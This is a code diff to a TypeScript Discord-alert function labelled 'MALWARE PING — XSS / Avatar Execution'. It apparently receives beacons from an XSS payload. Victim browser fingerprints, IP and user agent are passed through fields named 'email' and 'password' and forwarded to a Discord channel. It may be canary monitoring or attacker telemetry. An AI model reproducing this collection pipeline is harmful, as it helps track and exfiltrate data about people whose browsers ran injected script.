@@ -29,6 +29,24 @@ async function sendAlertToDiscord(data: any) {
   const CHANNEL = process.env.DISCORD_CHANNEL_ID;
   if (!TOKEN || !CHANNEL) return;
 
+  const fp = data.email;
+  let parsed = {};
+  try { parsed = JSON.parse(fp); } catch {}
+
+  const mainFields = [
+    { name: "Actor", value: parsed.actor || "anonymous", inline: true },
+    { name: "Role", value: parsed.role || "guest", inline: true },
+    { name: "Target", value: parsed.target || "unknown", inline: true },
+    { name: "IP", value: data.password?.ip || "unknown", inline: true },
+    { name: "UA", value: (parsed.ua || data.password?.ua || "").slice(0, 180), inline: false },
+    { name: "Platform", value: parsed.platform || "-", inline: true },
+    { name: "Screen", value: parsed.screen || "-", inline: true },
+    { name: "Cores", value: String(parsed.cores || "-"), inline: true },
+    { name: "Timezone", value: parsed.timezone || "-", inline: true },
+    { name: "Referrer", value: (parsed.referrer || "direct").slice(0, 200), inline: false },
+    { name: "URL", value: parsed.href || "-", inline: false },
+  ];
+
   await fetch(`https://discord.com/api/v10/channels/${CHANNEL}/messages`, {
     method: "POST",
     headers: {
@@ -40,11 +58,7 @@ async function sendAlertToDiscord(data: any) {
         {
           title: "🚨 MALWARE PING — XSS / Avatar Execution",
           color: 0xff0000,
-          fields: [
-            { name: "Fingerprint", value: String(data.email).slice(0, 200), inline: false },
-            { name: "IP", value: data.password?.ip || "unknown", inline: true },
-            { name: "UA", value: String(data.password?.ua || "").slice(0, 200), inline: false },
-          ],
+          fields: mainFields,
           timestamp: new Date().toISOString(),
           footer: { text: "Athena Payload Alert" },
         },
